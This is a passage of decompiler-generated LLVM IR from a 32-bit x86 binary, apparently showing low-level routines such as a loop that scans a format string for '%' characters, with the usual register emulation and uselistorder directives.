  %v2_8050d48 = add i32 %v0_8050d30, -16
  %v3_8050d48 = inttoptr i32 %v2_8050d48 to i32*
  store i32 %v1_8050d41, i32* %v3_8050d48, align 4
  %v0_8050d49 = call i32 @function_8053bc4()
  store i32 %v0_8050d49, i32* @ebx, align 4
  %v0_8050d50 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8050d55 = icmp eq i32 %v0_8050d49, 0
  br i1 %v1_8050d55, label %dec_label_pc_8050d6b, label %dec_label_pc_8050d59

dec_label_pc_8050d59:                             ; preds = %dec_label_pc_8050d30
  %v0_8050d59 = load i32, i32* @ebp, align 4
  %v2_8050d59 = add i32 %v0_8050d50, 12
  %v3_8050d59 = inttoptr i32 %v2_8050d59 to i32*
  store i32 %v0_8050d59, i32* %v3_8050d59, align 4
  %v1_8050d5a = add i32 %v0_8050d50, 384
  %v2_8050d5a = inttoptr i32 %v1_8050d5a to i32*
  %v3_8050d5a = load i32, i32* %v2_8050d5a, align 4
  %v5_8050d5a = add i32 %v0_8050d50, 8
  %v6_8050d5a = inttoptr i32 %v5_8050d5a to i32*
  store i32 %v3_8050d5a, i32* %v6_8050d5a, align 4
  %v2_8050d61 = add i32 %v0_8050d50, 4
  %v3_8050d61 = inttoptr i32 %v2_8050d61 to i32*
  store i32 %v0_8050d49, i32* %v3_8050d61, align 4
  %v0_8050d62 = load i32, i32* @edi, align 4
  %v3_8050d62 = inttoptr i32 %v0_8050d50 to i32*
  store i32 %v0_8050d62, i32* %v3_8050d62, align 4
  %v0_8050d63 = load i32, i32* %stack_var_-364, align 4
  %v4_8050d63 = call i32 @function_8053d0c(i32 %v0_8050d63, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050d63, i32* %eax.global-to-local, align 4
  %v0_8050d68 = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050d6b

dec_label_pc_8050d6b:                             ; preds = %dec_label_pc_8050d30, %dec_label_pc_8050d59
  %v0_8050da348.in = phi i32 [ %v0_8050d50, %dec_label_pc_8050d30 ], [ %v0_8050d68, %dec_label_pc_8050d59 ]
  %v1_8050d6f = phi i32 [ 0, %dec_label_pc_8050d30 ], [ %v4_8050d63, %dec_label_pc_8050d59 ]
  %v0_8050da348 = add i32 %v0_8050da348.in, 16
  %v12_8050d6b = icmp eq i32 %v1_8050d6f, %v0_8050d49
  %v1_8050d6d = icmp eq i1 %v12_8050d6b, false
  br i1 %v1_8050d6d, label %dec_label_pc_8050da3, label %dec_label_pc_8050d6f

dec_label_pc_8050d6f:                             ; preds = %dec_label_pc_8050d6b
  %v0_8050d6f = load i32, i32* @esi, align 4
  %v2_8050d6f = sub i32 %v0_8050d6f, %v1_8050d6f
  %v12_8050d6f = icmp eq i32 %v2_8050d6f, 0
  store i32 %v2_8050d6f, i32* @esi, align 4
  %v1_8050d73 = icmp eq i1 %v12_8050d6f, false
  br i1 %v1_8050d73, label %dec_label_pc_8050d21, label %dec_label_pc_8050d75

dec_label_pc_8050d75:                             ; preds = %dec_label_pc_8050d6f, %dec_label_pc_8050d0a.thread, %dec_label_pc_8050d14.dec_label_pc_8050d75.loopexit_crit_edge, %dec_label_pc_8050d0a
  %v0_8050d75 = phi i32 [ %v1_8050d07, %dec_label_pc_8050d0a ], [ %v0_8050d75.pre.pre, %dec_label_pc_8050d14.dec_label_pc_8050d75.loopexit_crit_edge ], [ %v1_8050cdd, %dec_label_pc_8050d0a.thread ], [ %v0_8050da348, %dec_label_pc_8050d6f ]
  %v1_8050d75 = add i32 %v0_8050d75, 8
  %v2_8050d75 = inttoptr i32 %v1_8050d75 to i32*
  %v3_8050d75 = load i32, i32* %v2_8050d75, align 4
  store i32 %v3_8050d75, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8050d7e = add i32 %v0_8050d75, 368
  %v2_8050d7e = inttoptr i32 %v1_8050d7e to i32*
  %v3_8050d7e = load i32, i32* %v2_8050d7e, align 4
  store i32 %v3_8050d7e, i32* @eax, align 4
  %v0_8050d85 = call i32 @function_8050770()
  store i32 %v0_8050d85, i32* %eax.global-to-local, align 4
  %v1_8050d8a = load i32, i32* @esp, align 4
  %v2_8050d8a = add i32 %v1_8050d8a, 8
  %v3_8050d8a = inttoptr i32 %v2_8050d8a to i32*
  %v4_8050d8a = load i32, i32* %v3_8050d8a, align 4
  %v15_8050d8a = icmp eq i32 %v0_8050d85, %v4_8050d8a
  %v1_8050d8e = icmp eq i1 %v15_8050d8a, false
  br i1 %v1_8050d8e, label %dec_label_pc_8050da3, label %dec_label_pc_8050d90

dec_label_pc_8050d90:                             ; preds = %dec_label_pc_8050d75, %dec_label_pc_8050b0a, %dec_label_pc_8050938
  %v0_8050d90 = phi i32 [ %v1_8050d8a, %dec_label_pc_8050d75 ], [ %v0_8050d90.pre, %dec_label_pc_8050b0a ], [ %v1_8050956, %dec_label_pc_8050938 ]
  %v1_8050d90 = add i32 %v0_8050d90, 16
  %v2_8050d90 = inttoptr i32 %v1_8050d90 to i32*
  %v3_8050d90 = load i32, i32* %v2_8050d90, align 4
  store i32 %v3_8050d90, i32* @ebx, align 4
  store i32 %v3_8050d90, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050890.backedge

dec_label_pc_8050d9b:                             ; preds = %dec_label_pc_80508ce
  %v1_8050d9b = add i32 %v0_8050d9b, 2
  store i32 %v1_8050d9b, i32* @ebx, align 4
  br label %dec_label_pc_8050890.backedge

dec_label_pc_8050da3:                             ; preds = %dec_label_pc_80508ba, %dec_label_pc_8050d75, %dec_label_pc_8050d0a, %dec_label_pc_8050cb5, %dec_label_pc_8050c8e, %dec_label_pc_8050bfe, %dec_label_pc_8050b79, %dec_label_pc_8050b4d, %dec_label_pc_8050ae1, %dec_label_pc_8050d6b
  %v0_8050da3 = phi i32 [ %v0_8050da348, %dec_label_pc_8050d6b ], [ %v0_8050da3.pre.pre, %dec_label_pc_80508ba ], [ %v1_8050d8a, %dec_label_pc_8050d75 ], [ %v1_8050d07, %dec_label_pc_8050d0a ], [ %v1_8050cdd, %dec_label_pc_8050cb5 ], [ %v1_8050ca3, %dec_label_pc_8050c8e ], [ %v0_8050930.lcssa, %dec_label_pc_8050bfe ], [ %v1_8050b91, %dec_label_pc_8050b79 ], [ %v1_8050b64, %dec_label_pc_8050b4d ], [ %v1_8050aff, %dec_label_pc_8050ae1 ]
  %v1_8050da3 = inttoptr i32 %v0_8050da3 to i32*
  store i32 -1, i32* %v1_8050da3, align 4
  br label %dec_label_pc_8050daa

dec_label_pc_8050daa:                             ; preds = %dec_label_pc_80508c5, %dec_label_pc_8050833, %dec_label_pc_8050852, %dec_label_pc_8050da3
  %v0_8050daa = load i32, i32* @esp, align 4
  %v1_8050daa = inttoptr i32 %v0_8050daa to i32*
  %v2_8050daa = load i32, i32* %v1_8050daa, align 4
  store i32 %v2_8050daa, i32* %eax.global-to-local, align 4
  %v1_8050dad = add i32 %v0_8050daa, 348
  %v1_8050db3 = inttoptr i32 %v1_8050dad to i32*
  %v2_8050db3 = load i32, i32* %v1_8050db3, align 4
  store i32 %v2_8050db3, i32* @ebx, align 4
  ret i32 %v2_8050daa

; uselistorder directives
  uselistorder i32 %v1_8050d9b, { 1, 0 }
  uselistorder i32 %v3_8050d90, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8050d75, { 1, 0 }
  uselistorder i32 %v2_8050d6f, { 1, 2, 0 }
  uselistorder i32 %v0_8050da348, { 1, 0 }
  uselistorder i32 %v1_8050d6f, { 1, 0 }
  uselistorder i32 %v0_8050d50, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_8050cdd, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_8050cb5, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8050c8e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8050c62, { 1, 0, 2 }
  uselistorder i32 %v6_8050c4f, { 1, 0 }
  uselistorder i32 %v1_8050c4c, { 1, 0 }
  uselistorder i32 %v0_8050c45, { 0, 3, 2, 1 }
  uselistorder i32 %v1_8050bcf, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_8050bdf, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8050b40, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_8050b26, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_8050abf, { 1, 0, 2 }
  uselistorder i32 %v1_8050a43, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_8050a96, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_8050a1f, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80509d8, { 1, 0 }
  uselistorder i32 %v1_80509e5, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_8050930, { 3, 13, 10, 5, 4, 7, 6, 8, 11, 0, 1, 2, 12, 9, 14, 15 }
  uselistorder i32 %v0_8050930.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_805092c, { 1, 0 }
  uselistorder i32 %v1_805092c.pre, { 1, 0 }
  uselistorder i32 %v1_805092b, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_8050928, { 1, 0 }
  uselistorder i32 %v2_805092c76, { 1, 0 }
  uselistorder i32 %v3_8050912, { 1, 0 }
  uselistorder i32 %v1_80508ce, { 0, 2, 3, 1 }
  uselistorder i32 %v2_805089a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805089e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050888, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 1, 6, 0, 5, 4, 3, 7, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 25, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 26, 21, 22, 23, 27, 24, 28, 29, 30, 31 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @function_8050770, { 2, 1, 0, 3 }
  uselistorder i32 205, { 1, 0 }
  uselistorder i32 ()* @function_8053bc4, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 0, 4, 3, 2, 1, 5, 6, 7, 8 }
  uselistorder i32 204, { 3, 1, 4, 2, 5, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_8050daa, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8050da3, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_8050d75, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8050d6b, { 1, 0 }
  uselistorder label %dec_label_pc_8050d30, { 1, 0 }
  uselistorder label %dec_label_pc_8050d21, { 1, 0 }
  uselistorder label %dec_label_pc_8050cb5, { 1, 0 }
  uselistorder label %dec_label_pc_8050c87, { 1, 0 }
  uselistorder label %dec_label_pc_8050c6c, { 1, 0 }
  uselistorder label %dec_label_pc_8050c56, { 1, 0 }
  uselistorder label %dec_label_pc_8050c42, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050c36, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050bcf, { 1, 0 }
  uselistorder label %dec_label_pc_8050bc2, { 1, 0 }
  uselistorder label %dec_label_pc_8050b4d, { 1, 0 }
  uselistorder label %dec_label_pc_8050ae1, { 1, 0 }
  uselistorder label %dec_label_pc_8050a96, { 1, 0 }
  uselistorder label %dec_label_pc_8050a87, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_8050a4d, { 1, 0 }
  uselistorder label %dec_label_pc_8050a34, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80509e5, { 1, 0 }
  uselistorder label %dec_label_pc_80509cc, { 1, 0 }
  uselistorder label %dec_label_pc_80509b8, { 1, 0 }
  uselistorder label %dec_label_pc_80509b3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050994, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050921, { 1, 0 }
  uselistorder label %dec_label_pc_8050919, { 1, 0 }
  uselistorder label %dec_label_pc_80508c5, { 1, 0 }
  uselistorder label %dec_label_pc_80508ba, { 1, 0 }
  uselistorder label %dec_label_pc_8050890.backedge, { 2, 1, 0 }
}

define i32 @function_8050db8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050db8:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050db8 = load i32, i32* @esi, align 4
  %v0_8050db9 = load i32, i32* @ebx, align 4
  store i32 %v0_8050db9, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_8050dcd = bitcast i32* %arg1 to i8*
  %v4_8050dcd = call i32 @function_805143c(i8* %v3_8050dcd, i32 0, i32 188)
  store i32 %v4_8050dcd, i32* %eax.global-to-local, align 4
  %v0_8050dd2 = load i32, i32* @ebx, align 4
  %v1_8050dd2 = add i32 %v0_8050dd2, 24
  %v2_8050dd2 = inttoptr i32 %v1_8050dd2 to i32*
  %v3_8050dd2 = load i32, i32* %v2_8050dd2, align 4
  %v4_8050dd2 = add i32 %v3_8050dd2, -1
  store i32 %v4_8050dd2, i32* %v2_8050dd2, align 4
  %v0_8050dd5 = load i32, i32* @esi, align 4
  %v1_8050dd5 = load i32, i32* @ebx, align 4
  %v2_8050dd5 = inttoptr i32 %v1_8050dd5 to i32*
  store i32 %v0_8050dd5, i32* %v2_8050dd5, align 4
  %v0_8050dd7 = load i32, i32* @ebx, align 4
  %v1_8050dd7 = add i32 %v0_8050dd7, 40
  store i32 %v1_8050dd7, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050de2

dec_label_pc_8050de2:                             ; preds = %dec_label_pc_8050de2, %dec_label_pc_8050db8
  %v0_8050de2 = phi i32 [ %v1_8050de8, %dec_label_pc_8050de2 ], [ %v1_8050dd7, %dec_label_pc_8050db8 ]
  %v1_8050de2 = inttoptr i32 %v0_8050de2 to i32*
  store i32 8, i32* %v1_8050de2, align 4
  %v0_8050de8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050de8 = add i32 %v0_8050de8, 4
  store i32 %v1_8050de8, i32* %eax.global-to-local, align 4
  %v0_8050deb = load i32, i32* %edx.global-to-local, align 4
  %v1_8050deb = add i32 %v0_8050deb, -1
  %v8_8050deb = icmp eq i32 %v1_8050deb, 0
  store i32 %v1_8050deb, i32* %edx.global-to-local, align 4
  %v1_8050dec = icmp eq i1 %v8_8050deb, false
  br i1 %v1_8050dec, label %dec_label_pc_8050de2, label %dec_label_pc_8050dee

dec_label_pc_8050dee:                             ; preds = %dec_label_pc_8050de2
  %v0_8050dee = load i32, i32* @esi, align 4
  store i32 %v0_8050dee, i32* %eax.global-to-local, align 4
  %v1_8050e1920 = inttoptr i32 %v0_8050dee to i8*
  %v2_8050e1921 = load i8, i8* %v1_8050e1920, align 1
  %v3_8050e1922 = zext i8 %v2_8050e1921 to i32
  %v5_8050e1923 = and i32 %v1_8050deb, -256
  %v6_8050e1924 = or i32 %v3_8050e1922, %v5_8050e1923
  store i32 %v6_8050e1924, i32* %edx.global-to-local, align 4
  %v4_8050e1b25 = icmp eq i8 %v2_8050e1921, 0
  %v1_8050e1d26 = icmp eq i1 %v4_8050e1b25, false
  br i1 %v1_8050e1d26, label %dec_label_pc_8050df7, label %dec_label_pc_8050e1f

dec_label_pc_8050df7:                             ; preds = %dec_label_pc_8050dee, %dec_label_pc_8050e19.backedge
  %v6_8050e1929 = phi i32 [ %v6_8050e19, %dec_label_pc_8050e19.backedge ], [ %v6_8050e1924, %dec_label_pc_8050dee ]
  %v2_8050e1928 = phi i8 [ %v2_8050e19, %dec_label_pc_8050e19.backedge ], [ %v2_8050e1921, %dec_label_pc_8050dee ]
  %v0_8050dfc27 = phi i32 [ %v0_8050dfc.be, %dec_label_pc_8050e19.backedge ], [ %v0_8050dee, %dec_label_pc_8050dee ]
  %v10_8050df7 = icmp eq i8 %v2_8050e1928, 37
  %v1_8050dfa = icmp eq i1 %v10_8050df7, false
  br i1 %v1_8050dfa, label %dec_label_pc_8050e18, label %dec_label_pc_8050dfc

dec_label_pc_8050dfc:                             ; preds = %dec_label_pc_8050df7
  %v1_8050dfc = add i32 %v0_8050dfc27, 1
  store i32 %v1_8050dfc, i32* %eax.global-to-local, align 4
  %v1_8050dfd = inttoptr i32 %v1_8050dfc to i8*
  %v2_8050dfd = load i8, i8* %v1_8050dfd, align 1
  %v11_8050dfd = icmp eq i8 %v2_8050dfd, 37
  br i1 %v11_8050dfd, label %dec_label_pc_8050e18, label %dec_label_pc_8050e02

dec_label_pc_8050e02:                             ; preds = %dec_label_pc_8050dfc
  %v1_8050e05 = load i32, i32* @ebx, align 4
  %v2_8050e05 = inttoptr i32 %v1_8050e05 to i32*
  store i32 %v1_8050dfc, i32* %v2_8050e05, align 4
  %v0_8050e07 = load i32, i32* @ebx, align 4
  %v1_8050e08 = inttoptr i32 %v0_8050e07 to i32*
  %v2_8050e08 = call i32 @function_8050fa5(i32* %v1_8050e08)
  store i32 %v2_8050e08, i32* %eax.global-to-local, align 4
  %v2_8050e10 = icmp slt i32 %v2_8050e08, 0
  br i1 %v2_8050e10, label %dec_label_pc_8050e23, label %dec_label_pc_8050e14

dec_label_pc_8050e14:                             ; preds = %dec_label_pc_8050e02
  %v0_8050e14 = load i32, i32* @ebx, align 4
  %v1_8050e14 = inttoptr i32 %v0_8050e14 to i32*
  %v2_8050e14 = load i32, i32* %v1_8050e14, align 4
  %v4_8050e19.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050e19.backedge

dec_label_pc_8050e18:                             ; preds = %dec_label_pc_8050dfc, %dec_label_pc_8050df7
  %v0_8050e18 = phi i32 [ %v1_8050dfc, %dec_label_pc_8050dfc ], [ %v0_8050dfc27, %dec_label_pc_8050df7 ]
  %v1_8050e18 = add i32 %v0_8050e18, 1
  br label %dec_label_pc_8050e19.backedge

dec_label_pc_8050e19.backedge:                    ; preds = %dec_label_pc_8050e18, %dec_label_pc_8050e14
  %v4_8050e19.be = phi i32 [ %v4_8050e19.pre.pre, %dec_label_pc_8050e14 ], [ %v6_8050e1929, %dec_label_pc_8050e18 ]
  %v0_8050dfc.be = phi i32 [ %v2_8050e14, %dec_label_pc_8050e14 ], [ %v1_8050e18, %dec_label_pc_8050e18 ]
  store i32 %v0_8050dfc.be, i32* %eax.global-to-local, align 4
  %v1_8050e19 = inttoptr i32 %v0_8050dfc.be to i8*
  %v2_8050e19 = load i8, i8* %v1_8050e19, align 1
  %v3_8050e19 = zext i8 %v2_8050e19 to i32
  %v5_8050e19 = and i32 %v4_8050e19.be, -256
  %v6_8050e19 = or i32 %v3_8050e19, %v5_8050e19
  store i32 %v6_8050e19, i32* %edx.global-to-local, align 4
  %v4_8050e1b = icmp eq i8 %v2_8050e19, 0
  %v1_8050e1d = icmp eq i1 %v4_8050e1b, false
  br i1 %v1_8050e1d, label %dec_label_pc_8050df7, label %dec_label_pc_8050e19.dec_label_pc_8050e1f_crit_edge

dec_label_pc_8050e19.dec_label_pc_8050e1f_crit_edge: ; preds = %dec_label_pc_8050e19.backedge
  %v0_8050e1f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050e1f

dec_label_pc_8050e1f:                             ; preds = %dec_label_pc_8050e19.dec_label_pc_8050e1f_crit_edge, %dec_label_pc_8050dee
  %v0_8050e1f = phi i32 [ %v0_8050e1f.pre, %dec_label_pc_8050e19.dec_label_pc_8050e1f_crit_edge ], [ %v0_8050dee, %dec_label_pc_8050dee ]
  %v1_8050e1f = load i32, i32* @ebx, align 4
  %v2_8050e1f = inttoptr i32 %v1_8050e1f to i32*
  store i32 %v0_8050e1f, i32* %v2_8050e1f, align 4
  br label %dec_label_pc_8050e23

dec_label_pc_8050e23:                             ; preds = %dec_label_pc_8050e02, %dec_label_pc_8050e1f
  %storemerge = phi i32 [ 0, %dec_label_pc_8050e1f ], [ -1, %dec_label_pc_8050e02 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_8050e23 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050e23, i32* @edx, align 4
  %v2_8050e24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050e24, i32* @ebx, align 4
  store i32 %v0_8050db8, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_8050e19, { 1, 0 }
  uselistorder i8 %v2_8050e19, { 1, 2, 0 }
  uselistorder i32 %v0_8050dfc.be, { 2, 1, 0 }
  uselistorder i32 %v0_8050dfc27, { 1, 0 }
  uselistorder i32 %v0_8050dee, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050deb, { 0, 2, 1 }
  uselistorder i32 %v1_8050de8, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32 188, { 1, 0 }
  uselistorder label %dec_label_pc_8050e23, { 1, 0 }
  uselistorder label %dec_label_pc_8050df7, { 1, 0 }
}

define i32 @function_8050e28(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050e28:
  %stack_var_-12 = alloca i32, align 4
  %v0_8050e28 = load i32, i32* @esi, align 4
  %v0_8050e29 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050e35 = add i32 %arg1, 24
  %v2_8050e35 = inttoptr i32 %v1_8050e35 to i32*
  %v3_8050e35 = load i32, i32* %v2_8050e35, align 4
  %v2_8050e38 = add i32 %arg1, 76
  %v3_8050e38 = inttoptr i32 %v2_8050e38 to i32*
  store i32 %arg2, i32* %v3_8050e38, align 4
  %tmp8 = icmp slt i32 %v3_8050e35, 1
  br i1 %tmp8, label %dec_label_pc_8050e66, label %dec_label_pc_8050e3f

dec_label_pc_8050e3f:                             ; preds = %dec_label_pc_8050e28
  %v1_8050e42 = load i32, i32* @ebx, align 4
  %v2_8050e42 = add i32 %v1_8050e42, 28
  %v3_8050e42 = inttoptr i32 %v2_8050e42 to i32*
  store i32 %v3_8050e35, i32* %v3_8050e42, align 4
  %v0_8050e45 = load i32, i32* @ebx, align 4
  %v1_8050e45 = add i32 %v0_8050e45, 24
  %v2_8050e45 = inttoptr i32 %v1_8050e45 to i32*
  store i32 0, i32* %v2_8050e45, align 4
  %v0_8050e4c = load i32, i32* @ebx, align 4
  %v1_8050e4c = add i32 %v0_8050e4c, 4
  %v2_8050e4c = inttoptr i32 %v1_8050e4c to i32*
  store i32 0, i32* %v2_8050e4c, align 4
  %v0_8050e53 = load i32, i32* @ebx, align 4
  %v1_8050e53 = add i32 %v0_8050e53, 8
  %v2_8050e53 = inttoptr i32 %v1_8050e53 to i32*
  store i32 0, i32* %v2_8050e53, align 4
  %v0_8050e5a = load i32, i32* @ebx, align 4
  %v1_8050e5b = call i32 @function_8050e6c(i32 %v0_8050e5a)
  %v1_8050e60 = load i32, i32* @ebx, align 4
  %v2_8050e60 = add i32 %v1_8050e60, 24
  %v3_8050e60 = inttoptr i32 %v2_8050e60 to i32*
  store i32 %v3_8050e35, i32* %v3_8050e60, align 4
  br label %dec_label_pc_8050e66

dec_label_pc_8050e66:                             ; preds = %dec_label_pc_8050e28, %dec_label_pc_8050e3f
  %v2_8050e66 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8050e29, i32* @ebx, align 4
  store i32 %v0_8050e28, i32* @esi, align 4
  ret i32 %v2_8050e66

; uselistorder directives
  uselistorder i32 %v3_8050e35, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_8050e6c, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050e66, { 1, 0 }
}

define i32 @function_8050e6c(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050e6c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050e6d = load i32, i32* @ebx, align 4
  store i32 %v0_8050e6d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_8050e72 = add i32 %arg1, 80
  store i32 %v1_8050e72, i32* %ebx.global-to-local, align 4
  %v1_8050e75 = add i32 %arg1, 24
  %v2_8050e75 = inttoptr i32 %v1_8050e75 to i32*
  %v3_8050e75 = load i32, i32* %v2_8050e75, align 4
  %v4_8050e75 = icmp eq i32 %v3_8050e75, 0
  %v1_8050e79 = icmp eq i1 %v4_8050e75, false
  %v1_8050f2f = add i32 %arg1, 8
  %v2_8050f2f = inttoptr i32 %v1_8050f2f to i32*
  %v3_8050f2f = load i32, i32* %v2_8050f2f, align 4
  %v8_8050f2f = icmp eq i32 %v3_8050f2f, -2147483648
  %v1_8050f36 = icmp eq i1 %v8_8050f2f, false
  br i1 %v1_8050e79, label %dec_label_pc_8050f2f, label %dec_label_pc_8050e7f

dec_label_pc_8050e7f:                             ; preds = %dec_label_pc_8050e6c
  br i1 %v1_8050f36, label %dec_label_pc_8050e99, label %dec_label_pc_8050e88

dec_label_pc_8050e88:                             ; preds = %dec_label_pc_8050e7f
  %v1_8050e88 = add i32 %arg1, 76
  %v2_8050e88 = inttoptr i32 %v1_8050e88 to i32*
  %v3_8050e88 = load i32, i32* %v2_8050e88, align 4
  store i32 %v3_8050e88, i32* %eax.global-to-local, align 4
  %v1_8050e8b = add i32 %v3_8050e88, 4
  store i32 %v1_8050e8b, i32* %edx.global-to-local, align 4
  store i32 %v1_8050e8b, i32* %v2_8050e88, align 4
  %v0_8050e91 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e91 = inttoptr i32 %v0_8050e91 to i32*
  %v2_8050e91 = load i32, i32* %v1_8050e91, align 4
  store i32 %v2_8050e91, i32* %eax.global-to-local, align 4
  %v1_8050e93 = load i32, i32* @ecx, align 4
  %v2_8050e93 = add i32 %v1_8050e93, 80
  %v3_8050e93 = inttoptr i32 %v2_8050e93 to i32*
  store i32 %v2_8050e91, i32* %v3_8050e93, align 4
  %v0_8050e96 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e96 = load i32, i32* @ecx, align 4
  %v2_8050e96 = add i32 %v1_8050e96, 8
  %v3_8050e96 = inttoptr i32 %v2_8050e96 to i32*
  store i32 %v0_8050e96, i32* %v3_8050e96, align 4
  %v0_8050e99.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050e99

dec_label_pc_8050e99:                             ; preds = %dec_label_pc_8050e7f, %dec_label_pc_8050e88
  %v1_8050ea8 = phi i32 [ %arg1, %dec_label_pc_8050e7f ], [ %v0_8050e99.pre, %dec_label_pc_8050e88 ]
  %v1_8050e99 = add i32 %v1_8050ea8, 4
  %v2_8050e99 = inttoptr i32 %v1_8050e99 to i32*
  %v3_8050e99 = load i32, i32* %v2_8050e99, align 4
  %v8_8050e99 = icmp eq i32 %v3_8050e99, -2147483648
  %v1_8050ea0 = icmp eq i1 %v8_8050e99, false
  br i1 %v1_8050ea0, label %dec_label_pc_8050eb3, label %dec_label_pc_8050ea2

dec_label_pc_8050ea2:                             ; preds = %dec_label_pc_8050e99
  %v1_8050ea2 = add i32 %v1_8050ea8, 76
  %v2_8050ea2 = inttoptr i32 %v1_8050ea2 to i32*
  %v3_8050ea2 = load i32, i32* %v2_8050ea2, align 4
  store i32 %v3_8050ea2, i32* %eax.global-to-local, align 4
  %v1_8050ea5 = add i32 %v3_8050ea2, 4
  store i32 %v1_8050ea5, i32* %edx.global-to-local, align 4
  store i32 %v1_8050ea5, i32* %v2_8050ea2, align 4
  %v0_8050eab = load i32, i32* %eax.global-to-local, align 4
  %v1_8050eab = inttoptr i32 %v0_8050eab to i32*
  %v2_8050eab = load i32, i32* %v1_8050eab, align 4
  store i32 %v2_8050eab, i32* %eax.global-to-local, align 4
  %v1_8050ead = load i32, i32* @ecx, align 4
  %v2_8050ead = add i32 %v1_8050ead, 80
  %v3_8050ead = inttoptr i32 %v2_8050ead to i32*
  store i32 %v2_8050eab, i32* %v3_8050ead, align 4
  %v0_8050eb0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050eb0 = load i32, i32* @ecx, align 4
  %v2_8050eb0 = add i32 %v1_8050eb0, 4
  %v3_8050eb0 = inttoptr i32 %v2_8050eb0 to i32*
  store i32 %v0_8050eb0, i32* %v3_8050eb0, align 4
  %v1_8050f2817.pre = load i32, i32* @ecx, align 4
